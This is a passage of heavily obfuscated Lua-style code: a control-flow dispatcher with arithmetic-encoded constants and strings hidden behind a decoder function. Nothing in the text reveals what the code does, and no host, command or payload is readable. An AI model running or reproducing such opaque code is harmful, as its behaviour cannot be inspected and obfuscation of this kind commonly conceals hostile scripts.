i=M[i]i=i(M,P)z=Y[H[-345569-(-345571)]]O=Y[H[-268682-(-268685)]]S=J(662139+-723650)h=O(S,k)S=J(-966524-(-905120))M=J(-760063+698573)P=z[h]M=i[M]M=M(i,P)k=11123312323026-(-961129)i=J(371672-433162)z=Y[H[-886146-(-886148)]]O=Y[H[972829-972826]]i=M[i]h=O(S,k)S=J(99754+-161113)k=8833735853561-882152 P=z[h]i=i(M,P)z=Y[H[841293+-841291]]O=Y[H[275242-275239]]h=O(S,k)S=J(-630856+569317)M=J(78888-140378)P=z[h]M=i[M]M=M(i,P)k=9903433025449-931238 z=Y[H[-175644-(-175646)]]O=Y[H[-636681+636684]]i=J(31144-92634)h=O(S,k)P=z[h]k=15982248856927-929869 i=M[i]S=J(901036-962542)i=i(M,P)z=Y[H[-707090+707092]]M=J(-37365-24125)O=Y[H[869935+-869932]]h=O(S,k)k=805734+12224003640022 P=z[h]M=i[M]M=M(i,P)z=Y[H[-323494-(-323496)]]i=J(651905+-713395)O=Y[H[-241510-(-241513)]]i=M[i]S=J(-835977-(-774398))h=O(S,k)P=z[h]i=i(M,P)k=-626257+23277759396008 S=J(612566+-674142)z=Y[H[547148+-547146]]M=J(443037+-504527)O=Y[H[-772950+772953]]h=O(S,k)P=z[h]k=29364701923651-414681 M=i[M]M=M(i,P)z=Y[H[-355387-(-355389)]]O=Y[H[-207813-(-207816)]]S=J(635176-696652)i=J(-844765+783275)h=O(S,k)k=-579760+30571213623371 P=z[h]i=M[i]S=J(755453+-816936)i=i(M,P)z=Y[H[-359316+359318]]O=Y[H[252228+-252225]]h=O(S,k)P=z[h]M=J(-890641-(-829151))M=i[M]k=1363008588335-(-342091)M=M(i,P)S=J(848169+-909756)z=Y[H[-646452+646454]]O=Y[H[-294557+294560]]h=O(S,k)P=z[h]i=J(-933920+872430)i=M[i]i=i(M,P)S=J(-243751+182371)z=Y[H[136827+-136825]]O=Y[H[-1000918-(-1000921)]]k=-317216+34837777880702 h=O(S,k)S=839027+13580580899648 P=z[h]M=J(83057+-144547)M=i[M]M=M(i,P)h=J(-833060-(-771705))P=Y[H[-959785-(-959787)]]z=Y[H[951482-951479]]O=z(h,S)i=P[O]k=766032+9424687489236 S=J(-533859+472238)E=M[i]i=J(350646-412088)Y[H[-144434-(-144438)]]=E M=o[i]i=J(197042-258395)z=Y[H[826465-826463]]O=Y[H[813414+-813411]]h=O(S,k)k=698663+18284340639771 S=J(-940815+879402)i=M[i]P=z[h]i=i(M,P)M=J(-661322-(-599832))z=Y[H[645809-645807]]O=Y[H[33330+-33327]]h=O(S,k)P=z[h]k=-373107+17663353835924 M=i[M]S=J(-73449+11850)M=M(i,P)z=Y[H[23217-23215]]i=J(189993+-251483)i=M[i]O=Y[H[1011172-1011169]]h=O(S,k)P=z[h]i=i(M,P)k=-977489+378067299073 z=Y[H[-1037671-(-1037673)]]S=J(-644445+582991)O=Y[H[-692840-(-692843)]]M=J(297123+-358613)h=O(S,k)P=z[h]M=i[M]M=M(i,P)z=Y[H[-625554-(-625556)]]k=34972618704866-477253 O=Y[H[-724187+724190]]S=J(-417238-(-355714))i=J(942062-1003552)h=O(S,k)P=z[h]i=M[i]S=J(-663127-(-601553))i=i(M,P)z=Y[H[-495941+495943]]O=Y[H[-754809-(-754812)]]M=J(-325261+263771)k=613722+31227396332403 h=O(S,k)P=z[h]M=i[M]M=M(i,P)z=Y[H[-791795+791797]]S=J(25482-86926)O=Y[H[-367374-(-367377)]]k=15408038795642-671092 i=J(-290116-(-228626))i=M[i]h=O(S,k)S=J(391076+-452581)P=z[h]i=i(M,P)k=-986543+6055712315570 z=Y[H[-423104-(-423106)]]M=J(164541+-226031)O=Y[H[759922-759919]]h=O(S,k)k=-757843+29059558507822 P=z[h]M=i[M]S=J(472011+-533397)M=M(i,P)z=Y[H[-533781+533783]]i=J(346018-407508)O=Y[H[-690348+690351]]h=O(S,k)i=M[i]P=z[h]i=i(M,P)z=Y[H[-329301+329303]]S=J(462452+-523902)O=Y[H[-120129-(-120132)]]k=3963835707421-338152 M=J(281190-342680)M=i[M]h=O(S,k)S=J(635439+-696877)P=z[h]M=M(i,P)z=Y[H[-572888-(-572890)]]k=19158492230791-119214 O=Y[H[-281578-(-281581)]]h=O(S,k)S=J(536639-597983)k=998934+9195691463332 i=J(-300564+239074)P=z[h]i=M[i]i=i(M,P)z=Y[H[-587722+587724]]O=Y[H[726239-726236]]M=J(-129438+67948)h=O(S,k)P=z[h]t=-1027166+8984406981813 M=i[M]M=M(i,P)k=-831282+25120989240547 z=Y[H[-582080+582082]]i=J(-562716+501226)S=J(715423+-776881)O=Y[H[-7517+7520]]h=O(S,k)S=J(941607-1003055)k=1023028+33092630028285 i=M[i]P=z[h]i=i(M,P)z=Y[H[476795-476793]]M=J(751251+-812741)O=Y[H[-920332-(-920335)]]b=J(-573401-(-512029))h=O(S,k)P=z[h]M=i[M]M=M(i,P)z=Y[H[1007457-1007455]]k=712509+27887887324029 O=Y[H[-294234+294237]]S=J(-623887+562298)h=O(S,k)i=J(1002170+-1063660)k=26717962200998-161549 i=M[i]P=z[h]S=J(-201977-(-140392))i=i(M,P)z=Y[H[649723-649721]]O=Y[H[-877695-(-877698)]]h=O(S,k)P=z[h]M=J(-898475+836985)M=i[M]S=4216208232933-(-783814)M=M(i,P)P=Y[H[957597+-957595]]z=Y[H[222076-222073]]h=J(354712-416306)O=z(h,S)S=J(-487347-(-425764))i=P[O]h=o[S]z=E j=Y[H[650371+-650370]]K=Y[H[-339303-(-339305)]]c=Y[H[-229627+229630]]e=c(b,t)q=K[e]e=J(493945-555335)b=-426173+1094727369402 s=j[q]q=Y[H[152337-152335]]K=Y[H[812023+-812020]]c=K(e,b)j=q[c]c=J(-331446-(-270047))D=s[j]j=Y[H[-848038+848040]]e=23510647561569-750237 q=Y[H[-353335+353338]]K=q(c,e)s=j[K]f=D[s]s=Y[H[-209687-(-209689)]]c=113077+20107719142110 j=Y[H[-831441+831444]]K=J(123366-184989)q=j(K,c)D=s[q]k=f[D]S=h(k)s=J(187048-248410)k=Y[H[-238924+238926]]j=-627910+9928462542549 f=Y[H[-2248+2251]]D=f(s,j)h=k[D]O=S~=h P=O E=O and 12637003-(-996869)or 637988+5304101 else f=J(-898056+836538)k=J(331644-393139)S=M M=o[k]k=J(-346909-(-285491))E=M[k]k=u()q=J(-873087+811569)Y[k]=E M=o[f]f=J(4592-66228)E=M[f]s=E j=o[q]f=E D=j E=j and 5134+956759 or 8766775-(-829158)end else E=4528473-(-522590)end else if E<10528360-(-20577)then if E<10991536-716953 then E=15034422-(-262336)else M=p E=Q E=-272473+12660205 end else h=J(862679+-924167)S=-1025884+13155334504265 M=J(205547-266989)E=o[M]P=Y[H[120340+-120339]]z=Y[H[560700+-560698]]O=z(h,S)M=J(705763-767116)M=E[M]i=P[O]M=M(E,i)S=-965131+13726271165186 P=Y[H[1045662+-1045661]]h=J(-1092867-(-1031502))E=J(932912+-994402)z=Y[H[835567+-835565]]E=M[E]O=z(h,S)i=P[O]E=E(M,i)P=Y[H[572807+-572806]]h=J(-648095-(-586694))z=Y[H[-204234-(-204236)]]S=-184000+27887873737082 M=J(44280-105770)O=z(h,S)S=20919133371223-480586 M=E[M]i=P[O]M=M(E,i)P=Y[H[1044312+-1044311]]E=J(-741506-(-680016))E=M[E]z=Y[H[766645-766643]]h=J(586563+-647915)O=z(h,S)i=P[O]E=E(M,i)P=Y[H[195837-195836]]h=J(430991-492389)z=Y[H[116590+-116588]]S=225054+23337801448277 O=z(h,S)M=J(902745+-964235)S=17525616605028-415619 h=J(-89572-(-28037))M=E[M]i=P[O]M=M(E,i)P=Y[H[-161521-(-161522)]]z=Y[H[389664+-389662]]O=z(h,S)E=J(-18532-42958)i=P[O]E=M[E]h=J(1029753+-1091291)E=E(M,i)S=-920618+1630271622945 P=Y[H[416453-416452]]z=Y[H[-1035515-(-1035517)]]O=z(h,S)M=J(913263+-974753)S=31665237580626-(-89671)i=P[O]h=J(-37257-24367)M=E[M]M=M(E,i)P=Y[H[-652594+652595]]z=Y[H[862806-862804]]O=z(h,S)i=P[O]E=J(-701759-(-640269))E=M[E]h=J(347456-409046)E=E(M,i)P=Y[H[-745076+745077]]S=408414+1605973084045 z=Y[H[-337662+337664]]O=z(h,S)i=P[O]M=J(-167449+105959)M=E[M]h=J(320653-382050)M=M(E,i)P=Y[H[327937+-327936]]S=18949981640610-(-903894)E=J(250333+-311823)E=M[E]z=Y[H[636765-636763]]O=z(h,S)i=P[O]E=E(M,i)P=Y[H[-489656-(-489657)]]M=J(-135344-(-73854))M=E[M]z=Y[H[236293+-236291]]S=436682+2848248044388 h=J(-947288-(-885919))O=z(h,S)i=P[O]M=M(E,i)E=J(-289785+228295)S=24667442529410-(-632924)P=Y[H[384039+-384038]]z=Y[H[59238-59236]]h=J(-21422+-40030)O=z(h,S)S=29216094800389-234721 E=M[E]i=P[O]h=J(-780213-(-718819))E=E(M,i)P=Y[H[957910+-957909]]z=Y[H[-100301-(-100303)]]M=J(-45341+-16149)O=z(h,S)M=E[M]i=P[O]h=J(-331597-(-270050))S=-856114+7485216710095 M=M(E,i)P=Y[H[685205-685204]]E=J(-149384+87894)E=M[E]z=Y[H[588014-588012]]O=z(h,S)h=J(-585355+523810)i=P[O]S=-994251+12663501849299 E=E(M,i)P=Y[H[557700-557699]]M=J(694993+-756483)M=E[M]z=Y[H[230613-230611]]O=z(h,S)i=P[O]M=M(E,i)E=J(-892856-(-831366))P=Y[H[877183+-877182]]S=126173+10273898358227 z=Y[H[-769401-(-769403)]]h=J(-784274+722704)O=z(h,S)i=P[O]E=M[E]E=E(M,i)P=Y[H[-362585+362586]]M=J(358917-420407)z=Y[H[89258+-89256]]S=5707329816250-130137 h=J(-776830+715397)M=E[M]O=z(h,S)i=P[O]M=M(E,i)E=J(-584562-(-523032))E=M[E]E=E(M)M={}E=o[J(455280-516878)]end end end else if E<-1032338+12345532 then if E<-865865+11873746 then if E<10689902-(-275973)then if E<9654701-(-1025180)then M={}i=W(i)E=o[J(-681744+620175)]else N=J(575497-636876)g=J(686136-747531)E=o[N]I=o[g]N=E(I)E=J(758649+-820013)o[E]=N E=6708823-(-978132)end else z=Y[H[-55431+55432]]h=Y[H[-118598+118600]]f=J(-693949+632394)D=25073039538563-19432 S=Y[H[-459320+459323]]k=S(f,D)O=h[k]P=z[O]O=Y[H[-822398+822400]]h=Y[H[389984+-389981]]k=J(-542357-(-480990))f=-667550+2415486727170 S=h(k,f)k=66253+14083291944657 z=O[S]i=P[z]S=J(4128+-65742)z=Y[H[954309+-954307]]O=Y[H[345203-345200]]h=O(S,k)P=z[h]S=31870386410375-88463 M=i[P]P=Y[H[478389-478387]]h=J(-649201+587769)z=Y[H[414010+-414007]]O=z(h,S)i=P[O]E=M[i]E=E and-349116+12040257 or 7419396-632468 end else if E<-981391+12147550 then if E<-502523+11647212 then E=true E=-697514+15516591 else r=-339107+339207 G=649131+-649129 x=625227+-625226 g=u()Y[g]=b X=-335034-(-335289)V=J(426311+-487806)M=o[V]V=J(-204342+142924)E=M[V]V=-103492-(-103493)M=E(V,r)r=816016-816016 V=u()Y[V]=M E=Y[k]M=E(r,X)r=u()B=619295+-609295 Y[r]=M T=J(944811-1006190)X=-34824-(-34825)E=Y[k]U=Y[V]M=E(X,U)X=u()Y[X]=M M=Y[k]U=M(x,G)M=979170-979169 y=718183-718183 E=U==M M=J(-65659+4031)G=J(-322386-(-260767))U=u()Y[U]=E Q=o[T]F=Y[k]R={F(y,B)}T=Q(L(R))E=J(912889-974348)Q=J(-175198+113579)p=T..Q x=G..p E=c[E]G=J(929927-991304)E=E(c,M,x)x=u()Y[x]=E p=a(8514388-893345,{k,g;s;z;P;e;U;x;V,X,r,D})M=o[G]G={M(p)}E={L(G)}G=E E=Y[U]E=E and 902759-(-1035572)or 13459927-179420 end else M=J(799550-860992)E=o[M]S=6367382550264-(-365725)M=J(112539+-173892)M=E[M]P=Y[H[-1011235-(-1011236)]]h=J(-841467+779976)z=Y[H[756126-756124]]O=z(h,S)i=P[O]M=M(E,i)P=Y[H[479575-479574]]E=J(800251+-861741)S=23061470206716-536842 h=J(-235773+174312)z=Y[H[247685+-247683]]O=z(h,S)h=J(327631-389124)S=224950+10266111796214 i=P[O]E=M[E]E=E(M,i)M=J(657941+-719431)P=Y[H[336105-336104]]z=Y[H[-658323+658325]]O=z(h,S)h=J(-830272-(-768947))M=E[M]S=1008803+4636966364108 i=P[O]M=M(E,i)E=J(-324357-(-262867))E=M[E]P=Y[H[-662147-(-662148)]]z=Y[H[857103-857101]]O=z(h,S)i=P[O]E=E(M,i)P=Y[H[-649821+649822]]z=Y[H[-490886+490888]]S=23180429584757-(-213173)M=J(274537-336027)h=J(-749341-(-687810))O=z(h,S)S=538422+16242175485525 i=P[O]M=E[M]M=M(E,i)E=J(745688+-807178)h=J(150852+-212248)P=Y[H[-250951+250952]]z=Y[H[368961+-368959]]O=z(h,S)i=P[O]E=M[E]S=33406485601187-(-319777)h=J(837111-898449)E=E(M,i)P=Y[H[279382+-279381]]M=J(-839429+777939)z=Y[H[282417-282415]]M=E[M]O=z(h,S)i=P[O]M=M(E,i)P=Y[H[-324671-(-324672)]]S=-983050+1976545985442 h=J(537001+-598329)E=J(195328-256818)E=M[E]z=Y[H[-338174+338176]]O=z(h,S)h=J(-271283-(-209872))i=P[O]S=436923+22934005808892 E=E(M,i)M=J(-2071+-59419)P=Y[H[371554+-371553]]z=Y[H[-698556-(-698558)]]O=z(h,S)M=E[M]i=P[O]S=275793+17046524045744 M=M(E,i)P=Y[H[-164719-(-164720)]]h=J(-1078606-(-1017125))z=Y[H[485938+-485936]]O=z(h,S)S=25754076030552-(-411776)E=J(-631103+569613)E=M[E]i=P[O]E=E(M,i)P=Y[H[-167753-(-167754)]]z=Y[H[-843438-(-843440)]]h=J(472343-533906)O=z(h,S)i=P[O]S=27452393850805-480710 M=J(712806+-774296)M=E[M]h=J(116907+-178517)M=M(E,i)P=Y[H[917611+-917610]]E=J(135681+-197171)z=Y[H[-747837+747839]]E=M[E]O=z(h,S)i=P[O]h=J(-737831-(-676218))E=E(M,i)P=Y[H[-327759+327760]]z=Y[H[-553292-(-553294)]]S=-1036900+3765126994237 O=z(h,S)M=J(-434332-(-372842))i=P[O]M=E[M]M=M(E,i)P=Y[H[-948598+948599]]h=J(876447-937783)z=Y[H[454202-454200]]S=2558779033462-819919 O=z(h,S)i=P[O]S=-908234+6374209152866 E=J(827547-889037)E=M[E]E=E(M,i)h=-750322+27286195135636 i=Y[H[-831828-(-831829)]]O=J(41375-102921)P=Y[H[-474379+474381]]z=P(O,h)M=i[z]P=Y[H[-977277-(-977278)]]z=Y[H[342382+-342380]]h=J(295551+-357040)O=z(h,S)i=P[O]E[M]=i E=o[J(853519+-914895)]M={}end end else if E<717048+11217532 then if E<10773737-(-955791)then if E<-406270+12000997 then P=Y[H[976261+-976259]]z=905326-905293 i=P*z P=13374325795670-(-863485)M=i+P i=-175843+35184372264675 P=-939738-(-939739)E=M%i Y[H[-581812+581814]]=E i=Y[H[513614-513611]]M=i~=P E=-74920+5333133 else M=J(-213475+152033)E=o[M]P=Y[H[-805735-(-805737)]]z=Y[H[-86287-(-86290)]]h=J(853767-915097)S=864504+3165492892874 O=z(h,S)h=J(464532+-526035)i=P[O]M=J(-340371-(-279018))M=E[M]M=M(E,i)S=255988+19499581078404 P=Y[H[20719+-20717]]z=Y[H[-846445-(-846448)]]E=J(-908520-(-847030))O=z(h,S)E=M[E]i=P[O]h=J(651859-713261)E=E(M,i)S=-794580+30201323869891 P=Y[H[625004-625002]]M=J(635286+-696776)z=Y[H[628108-628105]]M=E[M]O=z(h,S)i=P[O]M=M(E,i)S=-916078+8131711404344 h=J(-42019-19372)E=J(59744+-121234)P=Y[H[-1037077+1037079]]E=M[E]z=Y[H[-907964-(-907967)]]O=z(h,S)i=P[O]S=-813171+33900277425693 h=J(646571+-708001)E=E(M,i)P=Y[H[22244+-22242]]M=J(65122-126612)z=Y[H[-947229+947232]]O=z(h,S)M=E[M]i=P[O]M=M(E,i)h=J(62793-124404)E=J(262156-323646)P=Y[H[217379-217377]]S=-668195+29626987423751 z=Y[H[432711+-432708]]O=z(h,S)i=P[O]h=J(-634734+573288)E=M[E]E=E(M,i)P=Y[H[-783376+783378]]M=J(446141-507631)S=-17744+1424201943015 z=Y[H[-310665+310668]]O=z(h,S)M=E[M]i=P[O]M=M(E,i)P=Y[H[-975458-(-975460)]]E=J(141049+-202539)E=M[E]z=Y[H[518467-518464]]h=J(-360664+299318)S=33224319182308-141685 O=z(h,S)i=P[O]E=E(M,i)j=150745+18824410355044 S=3796740330237-68630 P=Y[H[1005912+-1005910]]h=J(3364-64813)z=Y[H[638012+-638009]]O=z(h,S)i=P[O]M=J(-637037-(-575547))M=E[M]M=M(E,i)P=Y[H[402427-402425]]E=J(799571-861061)E=M[E]z=Y[H[603510-603507]]h=J(-696351-(-634835))S=28130772519138-234935 O=z(h,S)i=P[O]h=J(-640341+578927)E=E(M,i)P=Y[H[764496-764494]]z=Y[H[-818248-(-818251)]]S=33453957338721-792967 O=z(h,S)S=118959842992-(-285063)M=J(-559465-(-497975))i=P[O]h=J(22520-83923)M=E[M]M=M(E,i)P=Y[H[-722165+722167]]z=Y[H[789982-789979]]O=z(h,S)i=P[O]E=J(-854273-(-792783))h=J(653557-715111)E=M[E]E=E(M,i)P=Y[H[-251311+251313]]z=Y[H[512791-512788]]S=5976064251452-248670 O=z(h,S)i=P[O]M=J(534379+-595869)M=E[M]M=M(E,i)E=J(-824715+763225)P=Y[H[964417-964415]]S=28769519454548-906496 E=M[E]h=J(887271-948877)z=Y[H[-779416+779419]]O=z(h,S)i=P[O]E=E(M,i)P=Y[H[-1038218+1038220]]S=967868+13980486341810 z=Y[H[-16945-(-16948)]]h=J(-472850+411427)O=z(h,S)i=P[O]h=-71485+6691830293353 M=J(-836110+774620)M=E[M]s=J(674427+-735979)M=M(E,i)O=J(551330-612964)i=Y[H[-110079-(-110081)]]P=Y[H[263819-263816]]z=P(O,h)E=i[z]h=Y[H[52757-52756]]k=Y[H[581138+-581136]]f=Y[H[-80467-(-80470)]]D=f(s,j)S=k[D]O=h[S]D=J(-761564-(-699946))s=23777531588326-148390 S=Y[H[-531182+531184]]k=Y[H[-966845-(-966848)]]f=k(D,s)h=S[f]f=J(83974-145391)D=72769+4518387051511 z=O[h]h=Y[H[858075-858073]]S=Y[H[966504+-966501]]k=S(f,D)f=21902973624487-(-116528)O=h[k]P=z[O]k=J(-539520-(-477938))O=Y[H[135739-135737]]h=Y[H[-747831+747834]]S=h(k,f)z=O[S]i=P[z]M[E]=i E=-667531+7454459 end else j=J(-679135+617762)q=6015+12401289805583 S=Y[H[-730156-(-730157)]]f=Y[H[95744+-95742]]D=Y[H[709593+-709590]]s=D(j,q)k=f[s]h=S[k]j=322732+147931992984 s=J(566246+-627713)k=Y[H[-958220+958222]]f=Y[H[-982701-(-982704)]]D=f(s,j)S=k[D]D=J(-816277+754750)O=h[S]S=Y[H[476454+-476452]]s=8557027416908-(-422980)k=Y[H[-1041575-(-1041578)]]f=k(D,s)h=S[f]f=J(-428471-(-367065))M=O[h]h=Y[H[-443589-(-443591)]]D=6481+23614320038307 S=Y[H[1022161-1022158]]k=S(f,D)O=h[k]E=M[O]E=E and-8904+2176253 or 13154190-156737 end else if E<12842763-838300 then if E<995266+10990577 then s=J(-218918+157280)E=Y[H[-72766+72769]]U=J(275543-336983)j=22224006340561-489317 I=884212+7209451114281 k=Y[H[217399-217395]]e=750276102906-936349 f=Y[H[785805+-785800]]X=340036+18475955450199 D=f(s,j)S=k[D]c=J(847561-909045)D=Y[H[-570455-(-570457)]]r=J(-417467-(-355902))j=Y[H[139096-139092]]q=Y[H[566248+-566243]]x=5879874884389-(-571277)K=q(c,e)s=j[K]f=D[s]c=J(832884+-894269)j=Y[H[36374+-36370]]q=Y[H[96754+-96749]]e=-866554+34798404450374 N=J(-1084755-(-1023399))K=q(c,e)s=j[K]K=J(-106547-(-45187))q=o[K]e=Y[H[96156+-96152]]b=Y[H[672441+-672436]]t=b(N,I)c=e[t]t=J(-210021-(-148692))b=o[t]I=Y[H[-896498+896502]]g=Y[H[809578+-809573]]V=g(r,X)N=I[V]V=Y[H[420513+-420509]]r=Y[H[558408+-558403]]X=r(U,x)g=V[X]I=P..g t=N..I e=b..t K=c..e j=q..K D=s..j k=f..D h=S..k M=E(h)E=14864368-(-338082)else P=Y[H[872888+-872885]]z=156766-156765 i=P~=z E=i and-390347+5055882 or 637825+4620388 end else E=o[J(-988699-(-927178))]M={}end end end end else if E<13284883-(-463415)then if E<336244+12942315 then if E<12571282-2074 then if E<-693694+13100014 then if E<13095819-710882 then i=J(-617083-(-555638))E=o[i]P=Y[H[953640-953632]]z=-942992+942992 i=E(P,z)E=87247+8911741 else Y[P]=M E=412041+8132001 end else t=Y[P]E=t and 16338905-827620 or 285200+13463827 b=t end else if E<-885128+14023783 then if E<13975659-1011611 then P=Y[H[-508699-(-508700)]]O=Y[H[883766-883764]]h=Y[H[101707-101704]]f=17539307133021-(-182154)k=J(-805900+744390)S=h(k,f)z=O[S]i=P[z]z=Y[H[-371726+371728]]S=J(-34258+-27216)O=Y[H[646165-646162]]k=1003133+22870473497372 h=O(S,k)S=29923701550258-(-494012)P=z[h]h=J(-6636+-54753)M=i[P]P=Y[H[571525-571523]]z=Y[H[358856+-358853]]O=z(h,S)i=P[O]E=M[i]E=E and 990883+14175504 or 11333302-(-814175)else E=o[J(-568358-(-506871))]i=W(i)P=W(P)z=nil M={}end else z=z+h P=z<=O k=not S P=k and P k=z>=O k=S and k P=k or P k=17322406-1022871 E=P and k P=1861008-(-437111)E=E or P end end else if E<-1013860+14583940 then if E<13988965-565542 then if E<748553+12565774 then Q=Y[P]p=Q E=Q and 8874788-229912 or 809007+5488763 else E=1659671-183229 end else P=Y[H[-81142-(-81144)]]z=Y[H[-543600+543603]]E=16100900-(-568191)i=P==z M=i end else if E<14273165-551890 then if E<13560448-(-98564)then E=5509802-(-432287)b=33414079182794-277251 e=J(482462+-543825)h=J(-272261+210882)O=o[h]s=Y[H[355146-355145]]q=Y[H[-342508-(-342510)]]K=Y[H[483447-483444]]c=K(e,b)j=q[c]e=905594435197-(-641832)D=s[j]c=J(140268-201808)j=Y[H[846442-846440]]q=Y[H[981232+-981229]]K=q(c,e)s=j[K]f=D[s]s=Y[H[57366+-57364]]c=22152465337376-(-1023019)K=J(824502+-886134)j=Y[H[-1023182-(-1023185)]]q=j(K,c)D=s[q]k=f[D]q=J(219592+-281159)K=21507466276716-706637 D=Y[H[-765015+765017]]s=Y[H[-806810+806813]]j=s(q,K)f=D[j]S=k[f]h=O(S)P=h else E=true Y[H[-172152+172153]]=E E=o[J(-727388-(-665941))]M={}end else D=8046109683013-(-352605)O=J(741252+-802844)M=o[O]f=J(263669-325206)h=Y[H[-966464+966466]]S=Y[H[-675651+675654]]k=S(f,D)O=h[k]E=M[O]O=a(6373720-(-716058),{H[-146710+146716];H[-329857-(-329859)];H[557415+-557412]})M=E(O)O=J(684491+-746083)f=J(-24437+-37192)M=o[O]h=Y[H[384472+-384470]]D=17319711544055-(-298122)S=Y[H[-397127-(-397130)]]k=S(f,D)O=h[k]E=M[O]O=v(566600+10712567,{H[384682-384680];H[-910350+910353]})M=E(O)E=12808149-1017545 end end end else if E<15287864-29743 then if E<14986054-76326 then if E<-92553+14484576 then if E<13611343-(-160040)then Y[P]=b E=Y[P]E=E and 10308766-65877 or-612568+11697193 else S=J(-666884+605331)i=u()P=J(736852+-798444)Y[i]=m[-694290+694291]k=4082772458292-734151 M=o[P]z=Y[H[342098-342097]]O=Y[H[-975510+975512]]h=O(S,k)P=z[h]E=M[P]z=E j=J(242438+-304050)q=221097+26137749950434 z=v(-41322+975922,{i;H[643409+-643408];H[225869+-225867];H[137437+-137434];H[-376422-(-376426)];H[-792771-(-792776)]})S=Y[i]f=Y[H[-538852-(-538853)]]D=Y[H[960755+-960753]]s=D(j,q)k=f[s]h=S[k]k=Y[H[210127+-210126]]j=-878642+16688277767821 f=Y[H[742753-742751]]s=J(701461-762803)D=f(s,j)j=22326035388253-(-1003839)S=k[D]O=h[S]h=284586+-284586 s=J(560111-621686)P=O or h M=E(P,z)h=Y[i]k=Y[H[873198-873197]]f=Y[H[-105777-(-105779)]]D=f(s,j)s=-381026+8511892217821 S=k[D]O=h[S]D=J(-410788-(-349179))S=Y[H[-127161+127162]]k=Y[H[292092-292090]]f=k(D,s)D=-955467+5155939196331 h=S[f]f=J(-1037447-(-975932))z=O[h]h=Y[H[364912+-364911]]S=Y[H[-79226+79228]]k=S(f,D)O=h[k]P=z[O]k=J(781190-842645)O=Y[H[-272478-(-272479)]]h=Y[H[-410234+410236]]f=10479466410895-450688 S=h(k,f)z=O[S]M=P[z]E=M and 6323574-(-93390)or 11034529-366109 end else E=l(-560548+10549681,{O})t={E()}E=o[J(566661+-628102)]M={L(t)}end else if E<1022770+14169949 then if E<15931595-777196 then E=o[J(599438+-660989)]M={P}else i=J(-934889+873447)M=o[i]z=Y[H[423839-423837]]k=263925+31119888789926 O=Y[H[352988-352985]]i=J(-782600-(-721247))S=J(1033931+-1095435)i=M[i]h=O(S,k)P=z[h]S=J(-708068+646602)i=i(M,P)k=32295162729079-(-43079)z=Y[H[-915785-(-915787)]]O=Y[H[-376769-(-376772)]]h=O(S,k)P=z[h]M=J(-137934-(-76444))S=J(-674997-(-613544))M=i[M]M=M(i,P)z=Y[H[-318263+318265]]i=J(-978989+917499)i=M[i]O=Y[H[983873-983870]]k=29479+13023671248009 h=O(S,k)P=z[h]k=494416+13598869917036 i=i(M,P)M=J(-239275+177785)M=i[M]S=J(-61053+-378)z=Y[H[-949990+949992]]O=Y[H[-154766+154769]]h=O(S,k)P=z[h]M=M(i,P)S=J(-370226+308843)k=32673229720429-626687 z=Y[H[-987478+987480]]O=Y[H[-10678-(-10681)]]h=O(S,k)i=J(-746318+684828)P=z[h]k=591799+12811916824471 i=M[i]S=J(-384664-(-323195))i=i(M,P)z=Y[H[698593+-698591]]O=Y[H[941370-941367]]h=O(S,k)M=J(-932425+870935)S=J(-297479-(-236070))M=i[M]P=z[h]M=M(i,P)z=Y[H[-292419+292421]]O=Y[H[68967-68964]]i=J(176201+-237691)k=9641894723962-(-544783)i=M[i]h=O(S,k)P=z[h]i=i(M,P)M=J(707045+-768535)z=Y[H[975835+-975833]]k=12896895585072-455611 M=i[M]S=J(521327+-582805)O=Y[H[666720+-666717]]h=O(S,k)S=J(-1087490-(-1025931))k=18867628998039-252742 P=z[h]M=M(i,P)z=Y[H[302454+-302452]]O=Y[H[-698614-(-698617)]]h=O(S,k)P=z[h]S=J(-650793-(-589190))i=J(-252412-(-190922))i=M[i]i=i(M,P)k=137711+3517080775798 z=Y[H[829803-829801]]O=Y[H[-797825+797828]]h=O(S,k)M=J(26234-87724)P=z[h]M=i[M]M=M(i,P)k=-777523+16860731276254 i=J(-1067416-(-1005926))z=Y[H[53489+-53487]]i=M[i]O=Y[H[-509229+509232]]S=J(-174467-(-112917))h=O(S,k)P=z[h]i=i(M,P)z=Y[H[-274436+274438]]S=J(-120977-(-59607))k=2841748953950-202291 O=Y[H[824815+-824812]]h=O(S,k)S=J(-375065-(-313583))P=z[h]M=J(540587+-602077)f=15890479947852-(-703643)M=i[M]M=M(i,P)i=J(255122-316612)i=M[i]z=Y[H[592638+-592636]]O=Y[H[-612223+612226]]k=2152+12712773373623 e=33037809542337-(-268119)h=O(S,k)P=z[h]k=6797346082472-(-720309)i=i(M,P)z=Y[H[739941+-739939]]M=J(-478804-(-417314))S=J(-666282-(-604805))O=Y[H[-538763+538766]]M=i[M]h=O(S,k)P=z[h]M=M(i,P)z=Y[H[449285-449283]]O=Y[H[-734381-(-734384)]]S=J(-914917-(-853309))i=J(925846-987336)i=M[i]k=750008192462-494705 h=O(S,k)P=z[h]k=5416288686698-(-620400)i=i(M,P)z=Y[H[-147549-(-147551)]]M=J(905352+-966842)O=Y[H[-839232+839235]]S=J(151288+-212654)h=O(S,k)M=i[M]k=33515309728576-886346 S=J(78336+-139681)P=z[h]M=M(i,P)z=Y[H[470344+-470342]]O=Y[H[966417+-966414]]h=O(S,k)P=z[h]i=J(575616-637106)i=M[i]S=-377624+4966217108512 i=i(M,P)P=Y[H[860656+-860654]]h=J(-550999+489395)z=Y[H[-410052+410055]]O=z(h,S)k=6589+14400695271540 M=P[O]E=i[M]S=J(380957+-442298)c=J(-567705-(-506089))Y[H[-701683-(-701687)]]=E i=J(-833385+771943)M=o[i]z=Y[H[1045294-1045292]]O=Y[H[-324498-(-324501)]]h=O(S,k)S=J(179553+-240978)k=-239174+34610036024634 i=J(262072-323425)P=z[h]i=M[i]i=i(M,P)z=Y[H[299008-299006]]M=J(237182-298672)O=Y[H[-201595-(-201598)]]h=O(S,k)P=z[h]k=28476863123366-(-418854)M=i[M]M=M(i,P)z=Y[H[776218+-776216]]S=J(140104-201637)O=Y[H[614432+-614429]]i=J(690258-751748)h=O(S,k)S=J(-564457+502897)i=M[i]k=34508414875376-342059 P=z[h]i=i(M,P)z=Y[H[850869-850867]]O=Y[H[-557579+557582]]h=O(S,k)M=J(-674902-(-613412))P=z[h]M=i[M]S=J(225265-286691)M=M(i,P)z=Y[H[-764600+764602]]k=-41977+9354125636860 O=Y[H[-847027-(-847030)]]h=O(S,k)S=J(-793721+732285)i=J(838320+-899810)P=z[h]i=M[i]i=i(M,P)k=-65188+26706570407736 z=Y[H[536483+-536481]]M=J(443165-504655)O=Y[H[-748359+748362]]M=i[M]h=O(S,k)k=929115+229636576015 